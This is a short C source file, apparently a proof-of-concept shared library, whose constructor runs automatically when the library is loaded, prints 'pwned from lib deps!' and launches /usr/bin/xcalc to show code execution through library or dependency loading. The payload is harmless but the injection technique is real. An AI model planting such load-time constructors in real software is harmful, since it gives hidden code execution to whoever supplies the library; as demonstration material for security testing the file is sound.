#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <sys/types.h>
#include <sys/wait.h>

extern char **environ;

void __attribute__ ((constructor)) init()
{
	printf("pwned from lib deps!\n");
	if (fork() == 0) {
		execve("/usr/bin/xcalc", NULL, environ);
		exit(0);
	}
}

